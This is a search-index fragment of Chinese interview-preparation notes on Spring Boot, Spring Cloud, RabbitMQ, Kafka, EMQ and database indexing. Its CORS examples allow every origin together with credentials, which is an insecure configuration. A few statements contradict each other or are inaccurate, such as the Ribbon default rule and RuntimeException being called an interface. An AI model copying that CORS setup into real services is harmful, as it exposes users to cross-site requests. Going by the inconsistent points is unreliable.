"},"面试必会篇/05-面试必会-SpringBoot&SpringCloud.html":{"url":"面试必会篇/05-面试必会-SpringBoot&SpringCloud.html","title":"05-面试必会-SpringBoot&SpringCloud","keywords":"","body":"01- 讲一讲SpringBoot自动装配的原理 1.在SpringBoot项目的启动引导类上都有一个注解@SpringBootApplication 这个注解是一个复合注解, 其中有三个注解构成 , 分别是 @SpringBootConfiguration : 是@Configuration的派生注解 , 标注当前类是一个SpringBoot的配置类 @ComponentScan : 开启组件扫描, 默认扫描的是当前启动引导了所在包以及子包 @EnableAutoConfiguration : 开启自动配置(自动配置核心注解) 2.在@EnableAutoConfiguration注解的内容使用@Import注解导入了一个AutoConfigurationImportSelector.class的类 在AutoConfigurationImportSelector.class中的selectImports方法内通过一系列的方法调用, 最终需要加载类加载路径下META-INF下面的spring.factories配置文件 3.在META-INF/spring.factories配置文件中, 定义了很多的自动配置类的完全限定路径 这些配置类都会被加载 4.加载配置类之后, 会配置类或者配置方法上的@ConditionalOnXxxx条件化注解是否满足条件 如果满足条件就会从属性配置类中读取相关配置 , 执行配置类中的配置方法 , 完成自动配置 02- 讲一讲SpringBoot启动流程 springboot项目在启动的时候, 首先会执行启动引导类里面的SpringApplication.run(AdminApplication.class, args)方法 这个run方法主要做的事情可以分为三个部分 : 第一部分进行SpringApplication的初始化模块，配置一些基本的环境变量、资源、构造器、监听器 第二部分实现了应用具体的启动方案，包括启动流程的监听模块、加载配置环境模块、及核心的创建上下文环境模块 第三部分是自动化配置模块，该模块作为springboot自动配置核心，在后面的分析中会详细讨论 03- 你们常用的SpringBoot起步依赖有哪些 04- springBoot支持的配置文件有哪些 ? 加载顺序是什么样的 1 properties文件 2 YAML文件 3 系统环境变量 4 命令行参数 如果有相同的配置参数, 后加载的会覆盖先加载的 05- 运行一个SpringBoot项目有哪些方式 直接使用jar -jar 运行 开发过程中运行main方法 可以配置插件 , 将springboot项目打war包, 部署到Tomcat中运行 直接用maven插件运行 maven spring-boot：run 07-Spring Boot的核心注解是哪个？他由哪几个注解组成的？ Spring Boot的核心注解是@SpringBootApplication , 他由几个注解组成 : @SpringBootConfiguration： 组合了- @Configuration注解，实现配置文件的功能； @EnableAutoConfiguration：打开自动配置的功能，也可以关闭某个自动配置的选项 @ComponentScan：Spring组件扫描 08-Spring Boot 中如何解决跨域问题 ? SpringMVC项目中使用@CrossOrigin注解来解决跨域问题 , 本质是CORS @RequestMapping(\"/hello\") @CrossOrigin(origins = \"*\") //@CrossOrigin(value = \"http://localhost:8081\") //指定具体ip允许跨域 public String hello() { return \"hello world\"; } SpringBoot项目采用自动配置的方式来配置CORS , 可以通过实现 WebMvcConfigurer接口然后重写addCorsMappings方法解决跨域问题。 @Configuration public class CorsConfig implements WebMvcConfigurer { @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping(\"/**\") //是否发送Cookie .allowCredentials(true) //放行哪些原始域 .allowedOrigins(\"*\") .allowedMethods(new String[]{\"GET\", \"POST\", \"PUT\", \"DELETE\"}) .allowedHeaders(\"*\") .exposedHeaders(\"*\"); } } 在SpringCloud项目中一般都会有网关 , 在网关中可以配置CORS跨域, 这样所有通过网关的请求都解决了跨域问题 spring: cloud: gateway: globalcors: cors-configurations: '[/**]': # 匹配所有请求 allowedOrigins: \"*\" #跨域处理 允许所有的域 allowedMethods: # 支持的方法 - GET - POST - PUT - DELETE 09- 你们项目中使用的SpringBoot是哪个版本 ? SpringBoot : 2.3.4.RELEASE SpringCloud : Hoxton.SR10 SpringCloudAlibaba : 2.2.5.RELEASE 10- Spring Cloud 5大组件有哪些？ 早期我们一般认为的Spring Cloud五大组件是 Eureka : 注册中心 Ribbon : 负载均衡 Feign : 远程调用 Hystrix : 服务熔断 Zuul/Gateway : 网关 随着SpringCloudAlibba在国内兴起 , 我们项目中使用了一些阿里巴巴的组件 注册中心/配置中心 Nacos 负载均衡 Ribbon 服务调用 Feign 服务保护 sentinel 服务网关 Gateway 11- 什么是微服务?微服务的优缺点是什么? 微服务就是一个独立的职责单一的服务应用程序，一个模块 1．优点：松耦合，聚焦单一业务功能，无关开发语言，团队规模降低 , 扩展性好, 天然支持分库 2．缺点：随着服务数量增加，管理复杂，部署复杂，服务器需要增多，服务通信和调用压力增大 12- 你们项目中微服务之间是如何通讯的? 1．同步通信：通过Feign发送http请求调用 2．异步：消息队列，如RabbitMq、KafKa等 13- 服务注册和发现是什么意思？Spring Cloud 如何实现服务注册发现？ 各种注册中心组件的原理和流程其实大体上类似 核心的功能就一下几个 : 服务注册 : 服务启动的时候会将服务的信息注册到注册中心, 比如: 服务名称 , 服务的IP , 端口号等 服务发现 : 服务调用方调用服务的时候, 根据服务名称从注册中心拉取服务列表 , 然后根据负载均衡策略 , 选择一个服务, 获取服务的IP和端口号, 发起远程调用 服务状态监控 : 服务提供者会定时向注册中心发送心跳 , 注册中心也会主动向服务提供者发送心跳探测, 如果长时间没有接收到心跳, 就将服务实例从注册中心下线或者移除 使用的话, 首先需要部署注册中心服务 , 然后在我们自己的微服务中引入注册中心依赖, 然后再配置文件中配置注册中心地址 就可以了 spring: application: name: leadnews-admin cloud: nacos: # 注册中心地址 discovery: server-addr: 124.221.75.8:8848 # 配置中心地址 config: server-addr: 124.221.75.8:8848 file-extension: yml 14- 你们项目负载均衡如何实现的 ? 服务调用过程中的负载均衡一般使用SpringCloud的Ribbon 组件实现 , Feign的底层已经自动集成了Ribbon , 使用起来非常简单 客户端调用的话一般会通过网关, 通过网关实现请求的路由和负载均衡 spring: cloud: gateway: routes: # 平台管理 - id: wemedia uri: lb://leadnews-wemedia predicates: - Path=/wemedia/** filters: - StripPrefix= 1 15- Ribbon负载均衡策略有哪些 ? 如果想自定义负载均衡策略如何实现 ? Ribbon默认的负载均衡策略有七种 : 内置负载均衡规则类 规则描述 RoundRobinRule 简单轮询服务列表来选择服务器。它是Ribbon默认的负载均衡规则。 AvailabilityFilteringRule 对以下两种服务器进行忽略： （1）在默认情况下，这台服务器如果3次连接失败，这台服务器就会被设置为“短路”状态。短路状态将持续30秒，如果再次连接失败，短路的持续时间就会几何级地增加。 （2）并发数过高的服务器。如果一个服务器的并发连接数过高，配置了AvailabilityFilteringRule规则的客户端也会将其忽略。并发连接数的上限，可以由客户端的..ActiveConnectionsLimit属性进行配置。 WeightedResponseTimeRule 为每一个服务器赋予一个权重值。服务器响应时间越长，这个服务器的权重就越小。这个规则会随机选择服务器，这个权重值会影响服务器的选择。 ZoneAvoidanceRule 以区域可用的服务器为基础进行服务器的选择。使用Zone对服务器进行分类，这个Zone可以理解为一个机房、一个机架等。而后再对Zone内的多个服务做轮询。 BestAvailableRule 忽略那些短路的服务器，并选择并发数较低的服务器。 RandomRule 随机选择一个可用的服务器。 RetryRule 重试机制的选择逻辑 默认的实现就是ZoneAvoidanceRule，是一种轮询方案 如果想要自定义负载均衡 , 可以自己创建类实现IRule接口 , 然后再通过配置类或者配置文件配置即可 : 通过定义IRule实现可以修改负载均衡规则，有两种方式： 代码方式：在order-service中的OrderApplication类中，定义一个新的IRule： @Bean public IRule randomRule(){ return new RandomRule(); } 配置文件方式：在order-service的application.yml文件中，添加新的配置也可以修改规则： userservice: # 给某个微服务配置负载均衡规则，这里是userservice服务 ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule # 负载均衡规则 16- 你们项目的配置文件是怎么管理的 ? 大部分的固定的配置文件都放在服务本地 , 一些根据环境不同可能会变化的部分, 放到Nacos中 17- 你们项目中有没有做过限流 ? 怎么做的 ? 限流一般有二种方式设置 : 第一种 : 网关配置限流 spring: application: name: api-gateway redis: host: localhost port: 6379 password: cloud: gateway: routes: - id: cloud-gateway uri: http://192.168.1.211:8088/ predicates: - Path=/ytb/** filters: - StripPrefix=1 - name: RequestRateLimiter args: redis-rate-limiter.replenishRate: 1 # 令牌桶每秒填充速率 redis-rate-limiter.burstCapacity: 2 # 令牌桶总容量 key-resolver: \"#{@pathKeyResolver}\" # 使用 SpEL 表达式按名称引用 bean 在上面的配置文件，配置了 redis 的信息，并配置了 RequestRateLimiter 的限流过滤器，该过滤器需要配置三个参数： burstCapacity，令牌桶总容量。 replenishRate，令牌桶每秒填充平均速率。 key-resolver，用于限流的键的解析器的 Bean 对象的名字。它使用 SpEL 表达式根据 #{@beanName} 从 Spring 容器中获取 Bean 对象 @Configuration public class KeyResolverConfiguration { @Bean public KeyResolver pathKeyResolver(){ return exchange -> Mono.just(exchange.getRequest().getURI().getPath()); } } 常见的限流算法有：计数器算法，漏桶（Leaky Bucket）算法，令牌桶（Token Bucket）算法。 Spring Cloud Gateway官方提供了RequestRateLimiterGatewayFilterFactory过滤器工厂，使用Redis 和Lua脚本实现了 令牌桶 的方式。 令牌桶算法 是对漏桶算法的一种改进，漏桶算法能够限制请求调用的速率，而令牌桶算法能够在限制调用的平均速率的同时还允许一定程度的突发调用。在令牌桶算法中，存在一个桶，用来存放固定数量的令牌。算法中存在一种机制，以一定的速率往桶中放令牌。每次请求调用需要先获取令牌，只有拿到令牌，才有机会继续执行，否则选择选择等待可用的令牌、或者直接拒绝。 放令牌这个动作是持续不断的进行，如果桶中令牌数达到上限，就丢弃令牌。所以就存在这种情况，桶中一直有大量的可用令牌，这时进来的请求就可以直接拿到令牌执行，比如设置qps为100，那么限流器初始化完成一秒后，桶中就已经有100个令牌了，这时服务还没完全启动好，等启动完成对外提供服务时，该限流器可以抵挡瞬时的100个请求。所以，只有桶中没有令牌时，请求才会进行等待，最后相当于以一定的速率执行。 第二种 : 使用服务保护组件Sentinel实现限流 建议回去看看微服务保护课程中的限流配置 18- 断路器/熔断器用过嘛 ? 断路器的状态有哪些 我们项目中使用Hystrix/Sentinel实现的断路器 , 断路器状态机包括三个状态： closed：关闭状态，断路器放行所有请求，并开始统计异常比例、慢请求比例。超过阈值则切换到open状态 open：打开状态，服务调用被熔断，访问被熔断服务的请求会被拒绝，快速失败，直接走降级逻辑。Open状态5秒后会进入half-open状态 half-open：半开状态，放行一次请求，根据执行结果来判断接下来的操作。 请求成功：则切换到closed状态 请求失败：则切换到open状态 19- 你们项目中有做过服务降级嘛 ? 我们项目中涉及到服务调用得地方都会定义降级, 一般降级逻辑就是返回默认值 , 降级的实现也非常简单 , 就是创建一个类实现FallbackFactory接口 , 然后再对应的Feign客户端接口上面 , 通过@FeignClient指定降级类 @Component @Slf4j public class OrderServiceFallbackFactory implements FallbackFactory { @Override public OrderService create(Throwable throwable) { log.error(\"调用订单服务失败\",throwable); return new OrderService() { @Override public String weixinPay(PayVO payVO) { return null; } @Override public Pager search(Integer pageIndex, Integer pageSize, String orderNo, String openId, String startDate, String endDate) { return new Pager<>(); } @Override public List getBusinessTop10Skus(Integer businessId) { return Lists.newArrayList(); } }; } } 20- 你们项目中异常是怎么控制的 ? 我们会根据不同的异常情况定义异常类 , 实现RuntimeException接口 , 然后在需要进行异常处理的位置对外抛出对应异常 在项目中使用@ControllerAdvice + @ExceptionHandler 捕获指定异常 , 处理异常 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-05-20 17:10 "},"面试必会篇/06-面试必会-MQ篇.html":{"url":"面试必会篇/06-面试必会-MQ篇.html","title":"06-面试必会-MQ篇","keywords":"","body":"RabbitMQ 01- 你们项目中哪里用到了RabbitMQ ? 我们项目中很多地方都使用了RabbitMQ , RabbitMQ 是我们项目中服务通信的主要方式之一 , 我们项目中服务通信主要有二种方式实现 : 通过Feign实现服务调用 通过MQ实现服务通信 基本上除了查询请求之外, 大部分的服务调用都采用的是MQ实现的异步调用 , 例如 : 发布内容的异步审核 验证码的异步发送 用户行为数据的异步采集入库 搜索历史记录的异步保存 用户信息修改的异步通知(用户修改信息之后, 同步修改其他服务中冗余/缓存的用户信息) 静态化页面的生成 MYSQL和Redis , ES之间的数据同步 .... 02- 为什么会选择使用RabbitMQ ? 有什么好处 ? 选择使用RabbitMQ是因为RabbitMQ的功能比较丰富 , 支持各种消息收发模式(简单队列模式, 工作队列模式 , 路由模式 , 直接模式 , 主题模式等) , 支持延迟队列 , 惰性队列而且天然支持集群, 保证服务的高可用, 同时性能非常不错 , 社区也比较活跃, 文档资料非常丰富 使用MQ有很多好处： 吞吐量提升：无需等待订阅者处理完成，响应更快速 故障隔离：服务没有直接调用，不存在级联失败问题 调用间没有阻塞，不会造成无效的资源占用 耦合度极低，每个服务都可以灵活插拔，可替换 流量削峰：不管发布事件的流量波动多大，都由Broker接收，订阅者可以按照自己的速度去处理事件 使用MQ也有很多缺点： 架构复杂了，业务没有明显的流程线，不好管理 需要依赖于Broker的可靠、安全、性能 03- 使用RabbitMQ如何保证消息不丢失 ? 消息从发送，到消费者接收，会经理多个过程 , 其中的每一步都可能导致消息丢失 针对这些问题，RabbitMQ分别给出了解决方案： 消息发送到交换机丢失 : 发布者确认机制publisher-confirm 消息发送到交换机失败会向生产者返回ACK , 生产者通过回调接收发送结果 , 如果发送失败, 重新发送, 或者记录日志人工介入 消息从交换机路由到队列丢失 : 发布者回执机制publisher-return 消息从交换机路由到队列失败会向生产者返回失败原因 , 生产者通过回调接收回调结果 , 如果发送失败, 重新发送, 或者记录日志人工介入 消息保存到队列中丢失 : MQ持久化(交换机持久化, 队列持久化 , 消息持久化) 消费者消费消息丢失 : 消费者确认机制 , 消费者失败重试机制 通过RabbitMQ本身所提供的机制基本上已经可以保证消息不丢失 , 但是因为一些特殊的原因还是会发送消息丢失问题 , 例如 : 回调丢失 , 系统宕机, 磁盘损坏等 , 这种概率很小 , 但是如果想规避这些问题 , 进一步提高消息发送的成功率, 也可以通过程序自己进行控制 设计一个消息状态表 , 主要包含 : 消息id , 消息内容 , 交换机 , 消息路由key , 发送时间, 签收状态等字段 , 发送方业务执行完毕之后 , 向消息状态表保存一条消息记录, 消息状态为未签收 , 之后再向MQ发送消息 , 消费方接收消息消费完毕之后 , 向发送方发送一条签收消息 , 发送方接收到签收消息之后 , 修改消息状态表中的消息状态为已签收 ! 之后通过定时任务扫描消息状态表中这些未签收的消息 , 重新发送消息, 直到成功为止 , 对于已经完成消费的消息定时清理即可 ! 04- 消息的重复消费问题如何解决的 ? 在使用RabbitMQ进行消息收发的时候, 如果发送失败或者消费失败会自动进行重试, 那么就有可能会导致消息的重复消费 , 具体的解决方案其实非常简单, 为每条消息设置一个唯一的标识id , 将已经消费的消息记录保存起来 , 后期再进行消费的时候判断是否已经消费过即可 , 如果已经消费过则不消费 , 如果没有消费过则正常消费 05- 如果有100万消息堆积在MQ , 如何解决 ? 解决消息堆积有三种思路： 提高消费者的消费能力 使用多线程消费 增加更多消费者，提高消费速度 使用工作队列模式, 设置多个消费者消费消费同一个队列中的消息 扩大队列容积，提高堆积上限 使用RabbitMQ惰性队列 06- RabbitMQ如何保证消费的顺序性 ? 一个队列只设置一个消费者消费即可 , 多个消费者之间是无法保证消息消费顺序性的 07- RabbitMQ的延迟队列有了解过嘛 ? RabbitMQ的延迟队列有二种实现方案 : 使用消息过期TTL + 死信交换机 使用延迟交换机插件 08- RabbitMQ如何设置消息过期 ? RabbitMQ置消息过期的方式有二种 : 为队列设置过期时间, 所有进到这个队列的消息就会具有统一的过期时间 @Bean public Queue ttlQueue(){ return QueueBuilder.durable(\"ttl.queue\") // 指定队列名称，并持久化 .ttl(10000) // 设置队列的超时时间，10秒 .deadLetterExchange(\"dl.ttl.direct\") // 指定死信交换机 .build(); } 为消息单独设置过期时间 @Test public void testTTLQueue() { // 创建消息 String message = \"hello, ttl queue\"; // 消息ID，需要封装到CorrelationData中 CorrelationData correlationData = new CorrelationData(UUID.randomUUID().toString()); // 发送消息 rabbitTemplate.convertAndSend(\"ttl.direct\", \"ttl\", message, correlationData); // 记录日志 log.debug(\"发送消息成功\"); } 注意 : 队列过期和消息过期同时存在 , 会以时间短的时间为准 RabbitMQ队列消息过期的机制是判断队列头部元素是否过期 , 如果队里头部消息没有到过期时间 , 中间消息到了过期时间, 这个消息也不会被自动剔除 09- 什么情况下消息会成为死信 ? 当一个队列中的消息满足下列情况之一时，就会成为死信（dead letter）： 消费者使用basic.reject或 basic.nack声明消费失败，并且消息的requeue参数设置为false 消息是一个过期消息，超时无人消费 要投递的队列消息满了，无法投递 10- 什么是死信交换机 ? 如何为队列绑定死信交换机 ? 死 信交换机和正常的交换机没有什么不同 , 如果一个包含死信的队列配置了dead-letter-exchange属性，指定了一个交换机，那么队列中的死信就会投递到这个交换机中，而这个交换机称为死信交换机 为队列绑定死信交换机 , 只需要设置队列属性 dead-letter-exchange即可 11- RabbitMQ的高可用机制有了解过嘛 ? RabbitMQ的是基于Erlang语言编写，而Erlang又是一个面向并发的语言，天然支持集群模式。RabbitMQ的集群有两种模式： •普通集群：是一种分布式集群，将队列分散到集群的各个节点，从而提高整个集群的并发能力。 会在集群的各个节点间共享部分数据，包括：交换机、队列元信息。不包含队列中的消息。 当访问集群某节点时，如果队列不在该节点，会从数据所在节点传递到当前节点并返回 队列所在节点宕机，队列中的消息就会丢失 •镜像集群：是一种主从集群，普通集群的基础上，添加了主从备份功能，提高集群的数据可用性。 交换机、队列、队列中的消息会在各个MQ的镜像节点之间同步备份。 所有操作都是主节点完成，然后同步给镜像节点 主宕机后，镜像节点会替代成新的主 Kafka 01- 你们项目中哪里用到了Kafka? 我们项目中很多地方都使用了Kafka, Kafka是我们项目中服务通信的主要方式之一 , 我们项目中服务通信主要有二种方式实现 : 通过Feign实现服务调用 通过Kafka实现服务通信 基本上除了查询请求之外, 大部分的服务调用都采用的是Kafka实现的异步调用 , 例如 : 发布内容的异步审核 验证码的异步发送 用户行为数据的异步采集入库 搜索历史记录的异步保存 用户信息修改的异步通知(用户修改信息之后, 同步修改其他服务中冗余/缓存的用户信息) 静态化页面的生成 MYSQL和Redis , ES之间的数据同步 推荐数据实时计算 ..... 02- 为什么会选择使用Kafka? 有什么好处 ? 选择使用Kafka是因为Kafka作为中间件他的吞吐量比较高 , 我们的系统中主要使用Kafka来处理一些用户的行为数据 , 用户行为数据用户操作成本低 , 数据量比较大 , 需要有更高的吞吐量支持 , 并且我们在项目中需要实现根据用户行为的实时推荐 , 运营端后台管理系统首页看板数据的实体展示 ! 使用Kafka有很多好处： 吞吐量提升：无需等待订阅者处理完成，响应更快速 故障隔离：服务没有直接调用，不存在级联失败问题 调用间没有阻塞，不会造成无效的资源占用 耦合度极低，每个服务都可以灵活插拔，可替换 流量削峰：不管发布事件的流量波动多大，都由Broker接收，订阅者可以按照自己的速度去处理事件 使用Kafka也有很多缺点： 架构复杂了，业务没有明显的流程线，不好管理 需要依赖于Broker的可靠、安全、性能 03- 使用Kafka如何保证消息不丢失 ? 使用Kafka在消息的收发过程都会出现消息丢失 , Kafka分别给出了解决方案 生产者发送消息到Brocker丢失 设置同步发送和异步发送 同步发送可以通过get()获取到消息的发送结果 , 阻塞方案, 效率比较低 异步发送可以通过回调获取到消息的发送接口 , 非阻塞方案, 效率较高 , 可能会出现回调丢失 设置消息发送失败的重试次数, 设置为一个很大的值, 发送失败不断重试 消息在Brocker中存储丢失 Kafka提供了分区的备份机制 , 可以为每个分区设置多个副本 , 主分区服务器宕机, 副本分区还有完整数据 主分区数据同步到副本分区之前, 主分区宕机也有可能会出现消息丢失问题 , 解决方案就是设置消息确认的ACKS | 确认机制 | 说明 | | ---------------- | ------------------------------------------------------------ | | acks=0 | 生产者在成功写入消息之前不会等待任何来自服务器的响应,消息有丢失的风险，但是速度最快 | | acks=1（默认值） | 只要集群首领节点收到消息，生产者就会收到一个来自服务器的成功响应 | | acks=all | 只有当所有参与赋值的节点全部收到消息时，生产者才会收到一个来自服务器的成功响应 | 消费者从Brocker接收消息丢失 消费者是通过offset来定位消费数据的 , 当消费者出现故障之后会触发重平衡, 会为消费者组中的消费者重新分配消费分区, 正常情况下是没有问题的 , 这也是Kafka提供的消费保障机制 但是在重平衡的过程中 , 因为Kafka默认子每隔5S自动提交偏移量 , 那么就有可能会出现消息丢失和重复消费问题 如果提交偏移量小于客户端处理的最后一个消息的偏移量，那么处于两个偏移量之间的消息就会被重复处理。 如果提交的偏移量大于客户端的最后一个消息的偏移量，那么处于两个偏移量之间的消息将会丢失。 解决方案有二种 : 设置更小的自动提交偏移量的周期 , 周期越小出现问题的概率也就越小, 对消费者性能和服务器压力的影响就越大(缓解方案,不能从根本上解决问题) 消费完毕手动提交偏移量 同步提交 : 会阻塞, 效率低 , 但是会重试 , 直到成功为止 异步提交 : 不会阻塞 , 效率高 , 但是不会重试 , 可能会出现提交失败问题 同步异步结合 通过Kafka本身所提供的机制基本上已经可以保证消息不丢失 , 但是因为一些特殊的原因还是会发送消息丢失问题 , 例如 : 回调丢失 , 系统宕机, 磁盘损坏等 , 这种概率很小 , 但是如果想规避这些问题 , 进一步提高消息发送的成功率, 也可以通过程序自己进行控制 设计一个消息状态表 , 主要包含 : 消息id , 消息内容 , 交换机 , 消息路由key , 发送时间, 签收状态等字段 , 发送方业务执行完毕之后 , 向消息状态表保存一条消息记录, 消息状态为未签收 , 之后再向Kafka发送消息 , 消费方接收消息消费完毕之后 , 向发送方发送一条签收消息 , 发送方接收到签收消息之后 , 修改消息状态表中的消息状态为已签收 ! 之后通过定时任务扫描消息状态表中这些未签收的消息 , 重新发送消息, 直到成功为止 , 对于已经完成消费的消息定时清理即可 ! 04- 消息的重复消费问题如何解决的 ? 消费者是通过offset来定位消费数据的 , 当消费者出现故障之后会触发重平衡, 会为消费者组中的消费者重新分配消费分区, 正常情况下是没有问题的 , 这也是Kafka提供的消费保障机制 但是在重平衡的过程中 , 因为Kafka默认子每隔5S自动提交偏移量 , 那么就有可能会出现消息丢失和重复消费问题 如果提交偏移量小于客户端处理的最后一个消息的偏移量，那么处于两个偏移量之间的消息就会被重复处理。 解决方案有二种 : 设置更小的自动提交偏移量的周期 , 周期越小出现问题的概率也就越小, 对消费者性能和服务器压力的影响就越大(缓解方案,不能从根本上解决问题) 消费完毕手动提交偏移量 同步提交 : 会阻塞, 效率低 , 但是会重试 , 直到成功为止 异步提交 : 不会阻塞 , 效率高 , 但是不会重试 , 可能会出现提交失败问题 同步异步结合 基于上面的操作如果因为网络原因, 服务器原因出现偏移量提交失败的情况 , 还是会出现重复消费 , 具体的解决方案其实非常简单, 为每条消息设置一个唯一的标识id , 将已经消费的消息记录保存起来 , 后期再进行消费的时候判断是否已经消费过即可 , 如果已经消费过则不消费 , 如果没有消费过则正常消费 05- Kafka如何保证消费的顺序性 ? topic分区中消息只能由消费者组中的唯一一个消费者处理，所以消息肯定是按照先后顺序进行处理的。 但是它也仅仅是保证Topic的一个分区顺序处理，不能保证跨分区的消息先后处理顺序。 所以，如果你想要顺序的处理Topic的所有消息，那就只提供一个分区。 06- Kafka的高可用机制有了解过嘛 ? Kafka作为一款使用比较广泛的消息中间件产品, 本身也提供了一些机制去实现高可用 , 主要包括 : Kafka 集群 : 通过集群模式, 保证Brocker的高可用 分区备份机制 : Kafka会为每一个分区设置副本 , 可以手动指定副本数量 , 这些副本会分配到Kafka的不同的Brocker上存储 , 这样可以保证Kafka数据高可用 重平衡 : 当消费者组中重新加入消费者 , 或者消费者组中有消费者宕机 , 这个时候Kafka会为消费者组中的消费者从新分配消费分区的过程就是再均衡 , 通过重平衡消实现了消费者的高可用 07- Kafka实现高性能的设计有了解过嘛 ? Kafka 高性能，是多方面协同的结果，包括宏观架构、分布式存储、ISR 数据同步、以及高效的利用磁盘、操作系统特性等。总结一下其实就是五个要点 顺序读写 消息分区 页缓存 零拷贝 消息压缩 分批发送 08- Kafka数据清理机制了解过嘛 ? Kafka中的数据保存在磁盘上以索引(xxxx.index)和日志文件(xxxx.log)的形式存储 日志是分段存储的，一方面能够减少单个文件内容的大小，另一方面，方便kafka 进行日志清理。 日志的清理策略有两个： 根据消息的保留时间，当消息在kafka中保存的时间超过了指定的时间，就会触发清理过程 log.retention.hours=168 默认7天 根据topic存储的数据大小，当topic所占的日志文件大小大于一定的阈值，则开始删除最久的消息。 kafka会启动一个后台线程，定期检查是否存在可以删除的消息。log.retention.bytes=1073741824 默认1G 通过上面这两个参数来设置，当其中任意一个达到要求，都会执行删除。 09- 使用Kafka如何实现点对点消息和发布订阅消息 Kafka的点对点消息和发布订阅消息是通过消费者组实现的 , 消费者组（Consumer Group）是由一个或多个消费者实例（Consumer Instance）组成的群组，具有可扩展性和可容错性的一种机制。 点对点模式 : 让多个消费者在同一个组中, 这样同一个组中只能有有个消费者消费同一个分区的数据就是点对点模式 发布-订阅模式 : 让多个消费者处于不同的组 , 这样不同组中的消费者都能消费同一个分区的数据就是发布-订阅模式 EMQ 01- EMQ是什么 ? 你们项目中哪里用到了EMQ? EMQ X 是开源社区中最流行的 MQTT 消息服务器。 MQTT协议广泛应用于物联网、移动互联网、智能硬件、车联网、电力能源等领域。 物联网M2M通信，物联网大数据采集 Android消息推送，WEB消息推送 移动即时消息，例如Facebook Messenger 智能硬件、智能家居、智能电器 车联网通信，电动车站桩采集 智慧城市、远程医疗、远程教育 电力、石油与能源等行业市场 所以EMQ的主要运用领域也就是物联网领域, 主要使用EMQ实现物联网设备之间的相互通信, 以及服务器和物联网设备之间的相互通信 EMQ X 是开源百万级分布式 MQTT 消息服务器（MQTT Messaging Broker），用于支持各种接入标准 MQTT 协议的设备，实现从设备端到服务器端的消息传递，以及从服务器端到设备端的设备控制消息转发。从而实现物联网设备的数据采集，和对设备的操作和控制 在我们的项目中主要使用EMQ实现了服务器和物联网设备之间的信息传输 , 而且使用EMQ作为消息队列产品实现了各个微服务之间的数据传输 , 例如 : 设置状态实时监控 自动维修工单创建和自动补货工单创建 订单创建以及支付结果确认 设备出货控制 设置出货结果通知处理等 ..... 02- 使用EMQ如何保证消息不丢失 ? 在MQTT 协议中规定了消息服务质量（Quality of Service），它保证了在不同的网络环境下消息传递的可靠性 ! MQTT消息服务质量QoS等级有三个级别 : 0 : 消息最多传递一次, 可能会存在消息丢失 1 : 消息至少传递一次 , 不会出现消息丢失, 但是可能会出现消息重复 2 : 消息仅传递一次 , 不会出现消息丢失, 也不会出现消息重复 03- 使用EMQ如何保证消息不重复消费 ? 在MQTT 协议中规定了消息服务质量（Quality of Service），它保证了在不同的网络环境下消息传递的可靠性 ! MQTT消息服务质量QoS等级有三个级别 : 0 : 消息最多传递一次, 可能会存在消息丢失 1 : 消息至少传递一次 , 不会出现消息丢失, 但是可能会出现消息重复 2 : 消息仅传递一次 , 不会出现消息丢失, 也不会出现消息重复 04- EMQ支不支持延迟消息, 如何实现 ? EMQ X 的延迟发布功能可以实现按照用户配置的时间间隔延迟发布 PUBLISH 报文的功能。当客户端使用特殊主题前缀 $delayed/{DelayInteval} 发布消息到 EMQ X 时，将触发延迟发布功能。延迟发布的功能是针对消息发布者而言的，订阅方只需要按照正常的主题订阅即可 05- 使用EMQ如何实现点对点消息和发布订阅消息 ? 默认情况下EMQ中的消息会发送给所有订阅了主题的订阅者 , 就是一种发布订阅机制 EMQ X 支持两种格式的共享订阅前缀： 模式 示例 前缀 真实主题名 不带群组共享订阅 $queue/t/1 $queue/ t/1 带群组共享订阅 $share/组名称/t/1 $share/abc t/1 如果想实现点对点消息, 可以采用EMQ中的不带群组的共享订阅 , 这样消息就只会被订阅者列表中的某一个订阅者接收, 可以在配置文件中配置负载均衡的策略broker.shared_subscription_strategy = random 均衡策略 描述 random 在所有订阅者中随机选择 round_robin 按照订阅顺序轮询 sticky 一直发往上次选取的订阅者 hash 按照发布者 ClientID 的哈希值 如果想不通的群组都只能有一个订阅者接收到消息, 可以使用带群组的共享订阅 , 这样每个群组中都会有一个订阅者接收到消息 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-06-08 14:34 "},"面试必会篇/07-面试必须-事物控制.html":{"url":"面试必会篇/07-面试必须-事物控制.html","title":"07-面试必须-事物控制","keywords":"","body":"1.简述关系型与非关系型数据库的区别？ 关系型数据库是依据关系模型来创建的数据库，所谓关系模型就是“一对一”、“一对多”、“对多对”等。常见的关系型数据库有Oracle、MySQL、SQL Server等。 非关系型数据库主要基于“非关系型模型”，其中非关系型模型有：列模型、键值对模型、文档类模型。比如redis属于键值对模型。 MongoDB属于文档模型 关系型数据库的优点： 易于维护：都是使用表结构，格式一致。 使用方便：SQL语言通用，可用于复杂查询。 复杂操作：支持SQL，可用于一个表以及多个表之间非常复杂的查询。 关系型数据库的缺点： 读写性能比较差，尤其是海量数据的高效率读写。 固定的表结构，灵活度稍欠。 高并发读写需求，传统关系型数据库来说，硬盘I/O是一个很大的瓶颈。 非关系型数据库的优点： 格式灵活：存储数据的格式可以是key,value形式、文档形式、图片形式等，使用灵活，应用场景广泛，而关系型数据库则只支持基础类型 速度快：nosql可使用硬盘或者随机存储器作为载体，关系型数据库只能使用硬盘。 成本低：nosql数据库部署简单，基本都是开源软件。 非关系型数据库的缺点： 不提供sql支持，学习和使用成本较高 不支持事物 数据结构相对复杂，复杂查询方面稍欠 2.简述为什么需要使用索引？ 优点 通过创建唯一性索引，可以保证数据库表中每一行数据的唯一性。 可以加快数据的检索速度，是创建索引的主要原因。 减少磁盘IO，可以直接定位。 通过使用索引，可以在查询过程中，使用优化隐藏器，提高系统的性能 缺点： 创建索引和维护索引需要耗费时间，时间随着数据量的增加而增加。 索引需要占用物理空间，特别是聚簇索引，需要较大的空间。 当对表中的数据进行增加、删除和修改的时候，索引也要动态的维护，这样就降低了数据的维护速度。 3.简述数据库索引采用B+树不采用B树的原因？ B+树更便于遍历：由于B+树的数据都存储在叶子结点中，分支结点均为索引，方便扫库，只需要扫一遍叶子结点即可，但是B树因为其分支结点同样存储着数据，我们要找到具体的数据，需要进行一次中序遍历按序来扫，所以B+树更加适合在区间查询的情况，所以通常B+树用于数据库索引。 